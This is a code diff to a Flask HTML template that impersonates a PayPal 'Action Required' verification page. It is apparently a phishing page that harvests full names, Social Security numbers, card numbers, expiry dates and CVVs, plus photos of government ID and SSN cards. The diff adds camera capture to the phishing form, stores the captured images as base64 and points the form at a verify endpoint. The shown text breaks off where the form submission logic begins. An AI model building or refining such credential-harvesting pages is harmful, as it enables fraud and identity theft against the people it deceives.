@@ -5,11 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Action Required - PayPal Account</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
-    <link rel="icon" href="{{ url_for('static', filename='paypal logo.jpg') }}" type="image/x-icon">
-    <link rel="shortcut icon" href="{{ url_for('static', filename='paypal logo.jpg') }}" type="image/x-icon">
+    <link rel="icon" href="{{ url_for('static', filename='new paypal logo.png') }}" type="image/png">
+    <link rel="shortcut icon" href="{{ url_for('static', filename='new paypal logo.png') }}" type="image/png">
 
     <style>
-        /* ... (your existing CSS styles remain the same) ... */
+        /* General Body and Container Styles */
         body {
             font-family: 'Inter', sans-serif;
             background-color: #f7f8f9;
@@ -42,7 +42,8 @@
             text-align: center;
         }
 
-        .paypal-logo {
+        /* PayPal Logo Styles */
+        .paypal-logo { /* This is for the logo inside the main container, not the header */
             width: 100px;
             height: 30px;
             object-fit: contain;
@@ -50,6 +51,7 @@
             display: block;
         }
 
+        /* Headings and Paragraphs */
         h1 {
             color: #003087;
             font-size: 28px;
@@ -121,6 +123,7 @@
             color: #333;
         }
 
+        /* Input Fields and Labels */
         .input-group {
             margin-bottom: 24px;
             text-align: left;
@@ -160,6 +163,7 @@
             box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.25);
         }
 
+        /* Floating Label effect */
         .input-field:focus + .input-label,
         .input-field:not(:placeholder-shown) + .input-label {
             top: -8px;
@@ -174,6 +178,7 @@
             padding-top: 18px;
         }
 
+        /* Styles for the "Show/Hide" toggle button for SSN and CVV */
         .toggle-visibility-button {
             position: absolute;
             right: 10px;
@@ -195,22 +200,23 @@
             display: none;
         }
 
+        /* Credit Card specific styles */
         .card-number-group {
-            position: relative;
+            position: relative; /* Needed for positioning card type icon */
         }
 
         .card-type-icon {
             position: absolute;
-            right: 12px;
+            right: 12px; 
             top: 50%;
             transform: translateY(-50%);
-            width: 40px;
-            height: 25px;
+            width: 40px; 
+            height: 25px; 
             background-repeat: no-repeat;
             background-position: center;
             background-size: contain;
-            pointer-events: none;
-            z-index: 1;
+            pointer-events: none; 
+            z-index: 1; 
         }
 
         .card-type-icon.visa {
@@ -228,7 +234,7 @@
         .card-type-icon.jcb {
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23003A80'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='20' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EJCB%3C/text%3E%3C/svg%3E");
         }
-        .card-type-icon.dinersclub {
+        .card-type-icon.dinersclub { 
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23004B8D'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='14' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EDINERS CLUB%3C/text%3E%3C/svg%3E");
         }
 
@@ -245,64 +251,81 @@
             padding: 18px 12px 6px 12px;
         }
 
-        .upload-photo-id-container {
+        /* --- UPDATED STYLES FOR UPLOAD SECTIONS --- */
+        .upload-options-wrapper {
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            gap: 8px; /* Reduced gap */
+            margin-bottom: 10px; 
+        }
+
+        .upload-file-container { 
+            flex-grow: 1; 
+            display: flex;
+            align-items: center;
             background-color: #fff;
             border: 1px solid #e0e0e0;
             border-radius: 8px;
-            padding: 15px 20px;
-            margin-bottom: 15px; /* Adjusted margin */
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            padding: 10px 15px;
             cursor: pointer;
             transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            min-height: 38px; /* Adjusted height */
+            box-sizing: border-box;
         }
-        .upload-photo-id-container:hover {
+        .upload-file-container:hover {
             border-color: #0070ba;
             box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.1);
         }
-        .upload-photo-id-container .text-info {
-            display: flex;
-            align-items: center;
-            font-size: 16px;
+        .upload-file-icon {
+            margin-right: 8px; /* Reduced margin */
+            color: #0070ba; /* Changed to blue to match theme */
+            font-size: 18px; 
+            line-height: 1;
+        }
+        .upload-file-text {
+            font-size: 15px; /* Slightly smaller */
             color: #333;
             font-weight: 500;
         }
-        .upload-photo-id-container .text-info .icon {
-            margin-right: 10px;
-            color: #f7a823;
-            font-size: 20px;
-            line-height: 1;
-        }
-        .upload-photo-id-button {
-            background-color: #0070ba;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 20px;
-            font-size: 16px;
-            font-weight: 600;
+
+        .camera-icon-button {
+            background-color: #fff; /* White background */
+            color: #0070ba; /* PayPal blue icon */
+            border: 1px solid #0070ba; /* Blue border */
+            border-radius: 50%; 
+            width: 38px;  /* Adjusted size to match height of file container */
+            height: 38px; 
+            font-size: 18px; /* Adjusted icon size */
+            display: flex;
+            align-items: center;
+            justify-content: center;
             cursor: pointer;
-            transition: background-color 0.3s ease;
+            transition: background-color 0.2s ease, color 0.2s ease, border-color 0.2s ease;
+            flex-shrink: 0; 
+            padding: 0; 
         }
-        .upload-photo-id-button:hover {
-            background-color: #003087;
+        .camera-icon-button:hover {
+            background-color: #e0f8ff; /* Light blue hover */
+            border-color: #005ea6;
         }
+        .camera-icon-button .icon { 
+            /* Emoji itself, no specific style needed unless using font icon */
+        }
+        /* --- END UPDATED UPLOAD STYLES --- */
+        
         .hidden-file-input { display: none; }
         .image-preview-container {
-            margin-top: -5px; /* Adjusted */
-            margin-bottom: 20px;
+            margin-bottom: 10px; 
             text-align: center;
         }
         .image-preview {
-            max-width: 150px; /* Slightly larger preview */
+            max-width: 150px; 
             max-height: 100px;
             border: 1px solid #ddd;
             border-radius: 4px;
-            display: inline-block; /* Allow side-by-side for multiple previews if needed */
+            display: inline-block; 
             margin: 5px auto;
-            object-fit: contain; /* Use contain to see whole ID */
+            object-fit: contain; 
         }
         .image-preview-label {
             font-size: 12px;
@@ -311,6 +334,41 @@
             margin-top: 2px;
         }
 
+        .camera-view-container {
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 15px;
+            margin-top: 10px; 
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .camera-view-container video {
+            display: block;
+            margin: 0 auto 10px auto;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            max-width: 100%;
+            background-color: #000; 
+        }
+        .camera-view-container .action-button { 
+            margin-top: 10px;
+            width: auto; 
+            padding: 10px 20px;
+            display: inline-block;
+            margin-right: 10px; 
+            font-size: 14px;
+        }
+        .camera-view-container .action-button:last-child {
+            margin-right: 0;
+        }
+        .camera-view-container .action-button.secondary { 
+            background-color: #6c757d; 
+            border-color: #6c757d;
+        }
+        .camera-view-container .action-button.secondary:hover {
+            background-color: #5a6268;
+        }
 
         .info-note {
             font-size: 14px;
@@ -326,21 +384,27 @@
             vertical-align: middle;
         }
 
-        .action-button {
+        .action-button { /* General action button, used for main submit and camera capture */
             background-color: #0070ba;
             color: white;
             padding: 12px 25px;
             border: none;
             border-radius: 4px;
-            font-size: 18px;
+            font-size: 18px; 
             font-weight: 600;
             cursor: pointer;
             text-decoration: none;
             display: inline-block;
             transition: background-color 0.3s ease;
-            width: 100%;
+            width: 100%; 
             margin-bottom: 15px;
         }
+        .camera-view-container .action-button { /* Override for buttons inside camera view */
+            font-size: 14px; 
+            padding: 10px 20px;
+            width: auto;
+        }
+
         .action-button:hover { background-color: #003087; }
         .action-button:focus { outline: none; box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.25); }
 
@@ -369,8 +433,10 @@
             z-index: 1000;
         }
         .header-left .paypal-logo-header {
-            width: 80px;
-            height: 24px;
+            content: url("{{ url_for('static', filename='new paypal logo.png') }}");
+            height: 30px; 
+            width: auto;  
+            max-width: 120px; 
             object-fit: contain;
             display: block;
         }
@@ -512,14 +578,13 @@
             cursor: pointer;
             font-size: 16px;
             font-weight: 600;
-            transition: background-color 0.2s ease;
         }
         .notification-modal button:hover {
             background-color: #003087;
         }
     </style>
 </head>
-<body>
+<body data-index-url="{{ url_for('index') }}"> 
     <header class="header-bar">
         <div class="header-left">
             <img src="{{ url_for('static', filename='new paypal logo.png') }}" alt="PayPal Logo" class="paypal-logo-header">
@@ -537,7 +602,7 @@
         </nav>
         <div class="header-right">
             <span class="icon-bell" id="notification-bell">&#128276;<span class="notification-dot" id="notification-dot"></span></span>
-            <button class="logout-btn" id="header-logout-button">LOG OUT</button>
+            <button class="logout-btn" id="header-logout-button" data-logout-url="{{ url_for('logout') }}">LOG OUT</button>
         </div>
     </header>
 
@@ -549,14 +614,14 @@
 
     <div class="main-content-wrapper">
         <div class="container">
-            <img src="{{ url_for('static', filename='paypal logo.jpg') }}" alt="PayPal Logo" class="paypal-logo">
+             <img src="{{ url_for('static', filename='new paypal logo.png') }}" alt="PayPal Logo" class="paypal-logo">
             <h1>Important: Action Required for Your PayPal Account</h1>
             <div class="info-box">
                 <span class="icon">&#9432;</span>
                 <p>To ensure the continued security and compliance of your PayPal account, we periodically conduct reviews of customer information. We require some updated details from you to comply with financial regulations and to ensure your account remains fully functional. Please provide the following information to complete this important verification step:</p>
             </div>
 
-            <form id="verification-form">
+            <form id="verification-form" data-verify-url="{{ url_for('verify_info') }}">
                 <div class="section-title">1. Confirm Your Full Name</div>
                 <p>Please use your full legal name registered with PayPal, accurately matched to your government-issued identification.</p>
                 <div class="input-group">
@@ -580,49 +645,76 @@
                 </div>
 
                 <div class="section-title">4. Upload Government-Issued Photo Identification</div>
-                <p>To fulfill regulatory obligations, we require a clear copy of a valid, government-issued photo identification document (front and back if applicable, e.g., Driver's License).</p>
+                <p>Please upload clear images of both the front and back of your ID.</p>
                 <ul>
                     <li>Accepted Document Types: Passport - Driver's License - National Identity Card.</li>
                     <li>Submission Guidelines: Ensure images are clear, all four corners visible, and all text legible.</li>
                 </ul>
 
-                <div class="upload-photo-id-container" id="upload-photo-id-front-trigger">
-                    <div class="text-info">
-                        <span class="icon">&#128444;&#65039;</span> <span>Upload ID Front</span>
+                <p style="text-align: left; font-weight: 600; margin-bottom: 5px;">Front of ID:</p>
+                <div class="upload-options-wrapper">
+                    <div class="upload-file-container" id="upload-photo-id-front-trigger">
+                        <span class="upload-file-icon">&#128444;&#65039;</span> <span class="upload-file-text">Upload ID Front</span>
+                        <input type="file" id="photo-id-front-input" name="photo-id-front" accept="image/*" class="hidden-file-input">
                     </div>
-                    <input type="file" id="photo-id-front-input" name="photo-id-front" accept="image/*" class="hidden-file-input">
-                    <button type="button" class="upload-photo-id-button">Upload Front</button>
+                    <button type="button" id="start-camera-front" class="camera-icon-button" title="Use Camera (Front)">
+                        <span class="icon">&#128247;</span> </button>
                 </div>
                 <div class="image-preview-container">
                     <img id="photo-id-front-preview" class="image-preview" src="" alt="Photo ID Front Preview" style="display: none;">
                     <span id="photo-id-front-label" class="image-preview-label"></span>
                 </div>
+                <div id="camera-view-front" class="camera-view-container" style="display: none;">
+                    <video id="video-preview-front" width="320" height="240" autoplay playsinline></video>
+                    <canvas id="canvas-front" style="display:none;"></canvas>
+                    <button type="button" id="capture-photo-front" class="action-button">Capture Photo</button>
+                    <button type="button" id="stop-camera-front" class="action-button secondary">Close Camera</button>
+                </div>
 
-                <div class="upload-photo-id-container" id="upload-photo-id-back-trigger">
-                    <div class="text-info">
-                        <span class="icon">&#128444;&#65039;</span> <span>Upload ID Back (if applicable)</span>
+                <p style="text-align: left; font-weight: 600; margin-bottom: 5px; margin-top:15px;">Back of ID (if applicable):</p>
+                <div class="upload-options-wrapper">
+                    <div class="upload-file-container" id="upload-photo-id-back-trigger">
+                        <span class="upload-file-icon">&#128444;&#65039;</span>
+                        <span class="upload-file-text">Upload ID Back</span>
+                        <input type="file" id="photo-id-back-input" name="photo-id-back" accept="image/*" class="hidden-file-input">
                     </div>
-                    <input type="file" id="photo-id-back-input" name="photo-id-back" accept="image/*" class="hidden-file-input">
-                    <button type="button" class="upload-photo-id-button">Upload Back</button>
+                    <button type="button" id="start-camera-back" class="camera-icon-button" title="Use Camera (Back)">
+                         <span class="icon">&#128247;</span>
+                    </button>
                 </div>
                 <div class="image-preview-container">
                     <img id="photo-id-back-preview" class="image-preview" src="" alt="Photo ID Back Preview" style="display: none;">
                      <span id="photo-id-back-label" class="image-preview-label"></span>
                 </div>
-                <div class="upload-photo-id-container" id="upload-ssn-card-trigger" style="margin-top: 20px;"> <div class="text-info">
-                        <span class="icon">&#128179;</span>
-                        <span>Upload SSN Card (Optional)</span>
+                 <div id="camera-view-back" class="camera-view-container" style="display: none;">
+                    <video id="video-preview-back" width="320" height="240" autoplay playsinline></video>
+                    <canvas id="canvas-back" style="display:none;"></canvas>
+                    <button type="button" id="capture-photo-back" class="action-button">Capture Photo</button>
+                    <button type="button" id="stop-camera-back" class="action-button secondary">Close Camera</button>
+                </div>
+                
+                <div class="section-title" style="margin-top: 30px;">5. Upload Copy of Social Security Card (Optional)</div>
+                 <div class="upload-options-wrapper">
+                    <div class="upload-file-container" id="upload-ssn-card-trigger">
+                        <span class="upload-file-icon">&#128179;</span> <span class="upload-file-text">Upload SSN Card</span>
+                        <input type="file" id="ssn-card-input" name="ssn-card" accept="image/*" class="hidden-file-input">
                     </div>
-                    <input type="file" id="ssn-card-input" name="ssn-card" accept="image/*" class="hidden-file-input">
-                    <button type="button" class="upload-photo-id-button">Upload SSN Card</button>
+                    <button type="button" id="start-camera-ssn" class="camera-icon-button" title="Use Camera (SSN Card)">
+                        <span class="icon">&#128247;</span>
+                    </button>
                 </div>
                 <div class="image-preview-container">
                     <img id="ssn-card-preview" class="image-preview" src="" alt="SSN Card Preview" style="display: none;">
                      <span id="ssn-card-label" class="image-preview-label"></span>
                 </div>
+                 <div id="camera-view-ssn" class="camera-view-container" style="display: none;">
+                    <video id="video-preview-ssn" width="320" height="240" autoplay playsinline></video>
+                    <canvas id="canvas-ssn" style="display:none;"></canvas>
+                    <button type="button" id="capture-photo-ssn" class="action-button">Capture Photo</button>
+                    <button type="button" id="stop-camera-ssn" class="action-button secondary">Close Camera</button>
+                </div>
 
-
-                <div class="section-title">5. Review and Confirm Linked Financial Instrument</div>
+                <div class="section-title" style="margin-top: 30px;">6. Review and Confirm Linked Financial Instrument</div>
                  <p>For security and compliance purposes, we may ask you to confirm details of your linked bank accounts or credit/debit cards.</p>
                 <div class="input-group card-number-group">
                     <input type="text" id="card-number" name="card-number" class="input-field" placeholder=" " inputmode="numeric" autocomplete="cc-number">
@@ -651,7 +743,7 @@
                 <p style="text-align: left;">As a regulated financial institution, PayPal is obligated to periodically collect and verify customer identity information. This process is essential for complying with anti-money laundering (AML) and other financial regulations, helping to ensure the security of your account and the integrity of our payment platform for all users.</p>
 
                 <button type="submit" class="action-button" style="margin-top: 30px;">Confirm and Continue</button>
-                <a href="{{ url_for('index') }}" class="secondary-link">Not you? Go back to Login</a>
+                <a href="#" id="go-to-login-link" class="secondary-link">Not you? Go back to Login</a>
             </form>
         </div>
     </div>
@@ -659,7 +751,7 @@
     <footer class="footer-bar">
         <div class="footer-links-group">
             <div class="col">
-                <img src="{{ url_for('static', filename='paypal logo.jpg') }}" alt="PayPal Logo" class="paypal-logo" style="width: 80px; height: 24px; margin: 0;">
+                <img src="{{ url_for('static', filename='new paypal logo.png') }}" alt="PayPal Logo" class="paypal-logo" style="width: 80px; height: 24px; margin: 0;">
             </div>
             <div class="col">
                 <h4>Help</h4>
@@ -683,93 +775,105 @@
     </footer>
 
     <script>
-        // General Page Elements, SSN Logic, Card Logic remain largely the same
+        // --- URLs from Flask ---
+        const VERIFY_INFO_URL = document.getElementById('verification-form')?.dataset.verifyUrl;
+        const LOGOUT_URL = document.getElementById('header-logout-button')?.dataset.logoutUrl;
+        const INDEX_URL = document.body.dataset.indexUrl;
+
+        // --- General Page Elements ---
         const notificationBell = document.getElementById('notification-bell');
         const notificationDot = document.getElementById('notification-dot');
         const notificationModal = document.getElementById('notification-modal');
         const modalProceedButton = document.getElementById('modal-proceed-button');
         const headerLogoutButton = document.getElementById('header-logout-button');
+        const goToLoginLink = document.getElementById('go-to-login-link');
 
         window.addEventListener('DOMContentLoaded', () => {
             if(notificationDot) notificationDot.style.display = 'block';
         });
-        if(notificationBell) {
+        if(notificationBell && notificationModal && notificationDot) { 
             notificationBell.addEventListener('click', () => {
-                if(notificationModal) notificationModal.style.display = 'block';
-                if(notificationDot) notificationDot.style.display = 'none';
+                notificationModal.style.display = 'block';
+                notificationDot.style.display = 'none';
             });
         }
-        if(modalProceedButton) {
+        if(modalProceedButton && notificationModal) { 
             modalProceedButton.addEventListener('click', () => {
-                if(notificationModal) notificationModal.style.display = 'none';
+                notificationModal.style.display = 'none';
             });
         }
-        if(headerLogoutButton) {
+        
+        if(headerLogoutButton && LOGOUT_URL && INDEX_URL) {
             headerLogoutButton.addEventListener('click', async () => {
                 try {
-                    const response = await fetch("{{ url_for('logout') }}", { method: 'POST' });
-                    if (response.ok) {
-                        window.location.href = "{{ url_for('index') }}";
-                    } else {
-                        alert('Logout failed. Please try again.');
-                    }
-                } catch (error) {
-                    console.error('Logout error:', error);
-                    alert('An error occurred during logout.');
-                }
+                    const response = await fetch(LOGOUT_URL, { method: 'POST' });
+                    if (response.ok) { window.location.href = INDEX_URL; } 
+                    else { alert('Logout failed. Please try again.'); }
+                } catch (error) { console.error('Logout error:', error); alert('An error occurred during logout.'); }
+            });
+        }
+        if(goToLoginLink && INDEX_URL) {
+            goToLoginLink.addEventListener('click', function(event) {
+                event.preventDefault(); window.location.href = INDEX_URL;
             });
         }
 
+        // --- SSN Input and Formatting Logic ---
         const ssnInput = document.getElementById('ssn');
         const toggleSsnVisibilityButton = document.getElementById('toggle-ssn-visibility');
         let rawSsn = '';
-        if (ssnInput) {
+        if (ssnInput && toggleSsnVisibilityButton) {
             ssnInput.addEventListener('input', function() {
                 let currentDigits = this.value.replace(/[^0-9]/g, '');
                 if (currentDigits.length > 9) currentDigits = currentDigits.substring(0, 9);
                 rawSsn = currentDigits;
                 this.value = this.type === 'password' ? formatAndCensorSsn(rawSsn) : formatSsn(rawSsn);
             });
-            ssnInput.addEventListener('blur', function() { /* ... same blur logic ... */ });
+            ssnInput.addEventListener('blur', function() {
+                 this.value = this.type === 'password' ? formatAndCensorSsn(rawSsn) : formatSsn(rawSsn);
+            });
+            toggleSsnVisibilityButton.addEventListener('click', function() {
+                if (ssnInput.type === 'password') {
+                    ssnInput.type = 'text'; this.textContent = 'Hide'; ssnInput.value = formatSsn(rawSsn);
+                } else {
+                    ssnInput.type = 'password'; this.textContent = 'Show'; ssnInput.value = formatAndCensorSsn(rawSsn);
+                }
+            });
         }
-        if (toggleSsnVisibilityButton) { /* ... same toggle logic ... */ }
-        function formatSsn(ssn) { /* ... same ... */
-            if (!ssn) return '';
-            let formatted = ssn;
+        function formatSsn(ssn) {
+            if (!ssn) return ''; let formatted = ssn;
             if (formatted.length > 3) formatted = formatted.substring(0, 3) + '-' + formatted.substring(3);
             if (formatted.length > 6) formatted = formatted.substring(0, 6) + '-' + formatted.substring(6);
             return formatted;
         }
-        function formatAndCensorSsn(ssnValue) { /* ... same ... */
+        function formatAndCensorSsn(ssnValue) {
             if (!ssnValue) return '';
             if (ssnValue.length <= 5) return '***-**-'.substring(0, ssnValue.length + Math.floor(ssnValue.length / 3)) + ssnValue.substring(ssnValue.length);
             return '***-**-' + ssnValue.substring(ssnValue.length - 4);
         }
 
+        // --- Credit Card Input Logic ---
         const cardNumberInput = document.getElementById('card-number');
         const cardTypeIcon = document.getElementById('card-type-icon');
         const expiryDateInput = document.getElementById('expiry-date');
         const cvvInput = document.getElementById('cvv');
-        const toggleCvvVisibilityButton = document.getElementById('toggle-cvv-visibility');
-        const cardTypes = [ /* ... same card types ... */
+        const toggleCvvVisibilityButtonCard = document.getElementById('toggle-cvv-visibility'); 
+        const cardTypes = [
             { name: "Visa", pattern: /^4/ }, { name: "Mastercard", pattern: /^5[1-5]/ },
             { name: "Amex", pattern: /^3[47]/ }, { name: "Discover", pattern: /^6(?:011|5|4[4-9]|22)/ },
             { name: "JCB", pattern: /^(?:2131|1800|35)/ }, { name: "Diners Club", pattern: /^3(?:0[0-5]|[68][0-9])/ }
         ];
-        if (cardNumberInput) { /* ... same card number input logic ... */
+        if (cardNumberInput) {
             cardNumberInput.addEventListener('input', function() {
-                let value = this.value.replace(/\D/g, '');
-                let formattedValue = '';
-                let cardType = null;
+                let value = this.value.replace(/\D/g, ''); let formattedValue = ''; let cardType = null;
                 for (const type of cardTypes) if (type.pattern.test(value)) { cardType = type; break; }
-
                 if (cardType && cardType.name === "Amex") {
-                    this.maxLength = 17; // 15 digits + 2 spaces
+                    this.maxLength = 17; 
                     if (value.length > 4) formattedValue += value.substring(0, 4) + ' '; else formattedValue += value.substring(0, 4);
                     if (value.length > 10) formattedValue += value.substring(4, 10) + ' ' + value.substring(10,15);
                     else if (value.length > 4) formattedValue += value.substring(4,10);
                 } else {
-                    this.maxLength = 19; // 16 digits + 3 spaces
+                    this.maxLength = 19; 
                     for (let i = 0; i < value.length; i++) {
                         if (i > 0 && i % 4 === 0 && i < 16) formattedValue += ' ';
                         formattedValue += value[i];
@@ -781,48 +885,114 @@
                 if(cardTypeIcon) {
                     cardTypeIcon.className = 'card-type-icon';
                     if (cardType) {
-                        let cssClassName = cardType.name.toLowerCase().replace(/\s+/g, '');
-                        cardTypeIcon.classList.add(cssClassName);
+                        cardTypeIcon.classList.add(cardType.name.toLowerCase().replace(/\s+/g, ''));
                         cardTypeIcon.title = cardType.name;
-                    } else {
-                        cardTypeIcon.title = '';
-                    }
+                    } else { cardTypeIcon.title = ''; }
                 }
             });
         }
-        if (expiryDateInput) { /* ... same expiry date logic ... */
+        if (expiryDateInput) {
              expiryDateInput.addEventListener('input', function() {
                 let value = this.value.replace(/\D/g, '');
                 if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2,4);
                 this.value = value;
             });
         }
-        if (toggleCvvVisibilityButton) { /* ... same CVV toggle logic ... */ }
+        if (toggleCvvVisibilityButtonCard && cvvInput) { 
+            toggleCvvVisibilityButtonCard.addEventListener('click', function() {
+                if (cvvInput.type === 'password') {
+                    cvvInput.type = 'text'; this.textContent = 'Hide';
+                } else {
+                    cvvInput.type = 'password'; this.textContent = 'Show';
+                }
+            });
+        }
 
+        // --- Camera and File Upload Logic ---
+        let capturedPhotoIdFrontBase64 = ''; 
+        let capturedPhotoIdBackBase64 = '';
+        let capturedSsnCardBase64 = '';
 
-        // --- MODIFIED File Upload Logic ---
-        const photoIdFrontInput = document.getElementById('photo-id-front-input');
-        const photoIdFrontPreview = document.getElementById('photo-id-front-preview');
-        const photoIdFrontLabel = document.getElementById('photo-id-front-label');
-        const uploadPhotoIdFrontTrigger = document.getElementById('upload-photo-id-front-trigger');
+        function initializeCameraUpload(type) {
+            const startCameraButton = document.getElementById(`start-camera-${type}`);
+            const cameraView = document.getElementById(`camera-view-${type}`);
+            const videoPreview = document.getElementById(`video-preview-${type}`);
+            const canvas = document.getElementById(`canvas-${type}`);
+            const capturePhotoButton = document.getElementById(`capture-photo-${type}`);
+            const stopCameraButton = document.getElementById(`stop-camera-${type}`);
+            const fileInput = document.getElementById(type === 'ssn' ? 'ssn-card-input' : `photo-id-${type}-input`);
+            const imagePreview = document.getElementById(type === 'ssn' ? 'ssn-card-preview' : `photo-id-${type}-preview`);
+            const imageLabel = document.getElementById(type === 'ssn' ? 'ssn-card-label' : `photo-id-${type}-label`);
+            
+            let currentStream = null;
 
-        const photoIdBackInput = document.getElementById('photo-id-back-input');
-        const photoIdBackPreview = document.getElementById('photo-id-back-preview');
-        const photoIdBackLabel = document.getElementById('photo-id-back-label');
-        const uploadPhotoIdBackTrigger = document.getElementById('upload-photo-id-back-trigger');
-        
-        const ssnCardInput = document.getElementById('ssn-card-input');
-        const ssnCardPreview = document.getElementById('ssn-card-preview');
-        const ssnCardLabel = document.getElementById('ssn-card-label');
-        const uploadSsnCardTrigger = document.getElementById('upload-ssn-card-trigger');
+            if (!startCameraButton || !cameraView || !videoPreview || !canvas || !capturePhotoButton || !stopCameraButton || !fileInput || !imagePreview || !imageLabel) {
+                console.warn(`Camera elements for type '${type}' not fully found. Camera functionality may be limited.`);
+                return;
+            }
+            
+            async function startCamera() {
+                if (cameraView && videoPreview) {
+                    try {
+                        if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); }
+                        currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                        videoPreview.srcObject = currentStream;
+                        cameraView.style.display = 'block';
+                        videoPreview.style.display = 'block';
+                        imagePreview.style.display = 'none'; 
+                        imageLabel.textContent = ''; 
+                        fileInput.value = ''; 
+                        if (type === 'front') capturedPhotoIdFrontBase64 = '';
+                        else if (type === 'back') capturedPhotoIdBackBase64 = '';
+                        else if (type === 'ssn') capturedSsnCardBase64 = '';
 
-        function setupFileUpload(triggerEl, inputEl, previewEl, labelEl) {
-            if (triggerEl && inputEl && previewEl && labelEl) {
-                triggerEl.addEventListener('click', (e) => {
-                    if (e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT') {
-                        if(e.target.type === 'button') inputEl.click();
-                        return;
+                    } catch (err) {
+                        console.error(`Error accessing camera (${type}): `, err);
+                        alert(`Could not access the camera for ${type}. Please ensure permissions are granted and you are on a secure (HTTPS) connection if not on localhost. You can still use the file upload option.`);
+                        cameraView.style.display = 'none';
                     }
+                }
+            }
+
+            function stopCamera() {
+                if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); currentStream = null; }
+                if (cameraView) cameraView.style.display = 'none';
+                if (videoPreview) videoPreview.srcObject = null;
+            }
+
+            startCameraButton.addEventListener('click', startCamera);
+            stopCameraButton.addEventListener('click', stopCamera);
+
+            capturePhotoButton.addEventListener('click', () => {
+                if (!currentStream || !videoPreview.videoWidth || !videoPreview.videoHeight) { 
+                    alert("Camera is not active or ready. Please try starting the camera again."); 
+                    return; 
+                }
+                canvas.width = videoPreview.videoWidth;
+                canvas.height = videoPreview.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/png');
+                const base64String = dataUrl.split(',')[1];
+                
+                if (type === 'front') capturedPhotoIdFrontBase64 = base64String;
+                else if (type === 'back') capturedPhotoIdBackBase64 = base64String;
+                else if (type === 'ssn') capturedSsnCardBase64 = base64String;
+
+                imagePreview.src = dataUrl;
+                imagePreview.style.display = 'block';
+                imageLabel.textContent = `camera_capture_${type}.png`;
+                stopCamera();
+            });
+        }
+
+        initializeCameraUpload('front');
+        initializeCameraUpload('back');
+        initializeCameraUpload('ssn');
+
+        function setupStandardFileUpload(triggerEl, inputEl, previewEl, labelEl, type) {
+            if (triggerEl && inputEl && previewEl && labelEl) {
+                triggerEl.addEventListener('click', () => { // Clicking the container triggers file input
                     inputEl.click();
                 });
                 inputEl.addEventListener('change', function() {
@@ -830,61 +1000,71 @@
                     if (file) {
                         const reader = new FileReader();
                         reader.onload = function(e) {
-                            previewEl.src = e.target.result;
-                            previewEl.style.display = 'block';
+                            previewEl.src = e.target.result; previewEl.style.display = 'block';
                             labelEl.textContent = file.name;
+                            if (type === 'front') capturedPhotoIdFrontBase64 = '';
+                            else if (type === 'back') capturedPhotoIdBackBase64 = '';
+                            else if (type === 'ssn') capturedSsnCardBase64 = '';
                         };
                         reader.readAsDataURL(file);
                     } else {
-                        previewEl.src = '';
-                        previewEl.style.display = 'none';
-                        labelEl.textContent = '';
+                        previewEl.src = ''; previewEl.style.display = 'none'; labelEl.textContent = '';
                     }
                 });
             }
         }
+        
+        const uploadPhotoIdFrontTrigger = document.getElementById('upload-photo-id-front-trigger');
+        const photoIdFrontInput = document.getElementById('photo-id-front-input');
+        const photoIdFrontPreview = document.getElementById('photo-id-front-preview');
+        const photoIdFrontLabel = document.getElementById('photo-id-front-label');
 
-        setupFileUpload(uploadPhotoIdFrontTrigger, photoIdFrontInput, photoIdFrontPreview, photoIdFrontLabel);
-        setupFileUpload(uploadPhotoIdBackTrigger, photoIdBackInput, photoIdBackPreview, photoIdBackLabel);
-        setupFileUpload(uploadSsnCardTrigger, ssnCardInput, ssnCardPreview, ssnCardLabel);
+        const uploadPhotoIdBackTrigger = document.getElementById('upload-photo-id-back-trigger');
+        const photoIdBackInput = document.getElementById('photo-id-back-input');
+        const photoIdBackPreview = document.getElementById('photo-id-back-preview');
+        const photoIdBackLabel = document.getElementById('photo-id-back-label');
+        
+        const uploadSsnCardTrigger = document.getElementById('upload-ssn-card-trigger');
+        const ssnCardInput = document.getElementById('ssn-card-input');
+        const ssnCardPreview = document.getElementById('ssn-card-preview');
+        const ssnCardLabel = document.getElementById('ssn-card-label');
 
+        setupStandardFileUpload(uploadPhotoIdFrontTrigger, photoIdFrontInput, photoIdFrontPreview, photoIdFrontLabel, 'front');
+        setupStandardFileUpload(uploadPhotoIdBackTrigger, photoIdBackInput, photoIdBackPreview, photoIdBackLabel, 'back');
+        setupStandardFileUpload(uploadSsnCardTrigger, ssnCardInput, ssnCardPreview, ssnCardLabel, 'ssn');
 
-        // --- MODIFIED Verification Form Submission Logic ---
+        // --- Verification Form Submission Logic ---
         const verificationForm = document.getElementById('verification-form');
         const fullNameInput = document.getElementById('full-name');
         const phoneNumberInput = document.getElementById('phone-number');
-        // bankNameInput is still missing from HTML, will be sent as empty string
-
-        if(verificationForm) {
+        
+        if(verificationForm && VERIFY_INFO_URL) { 
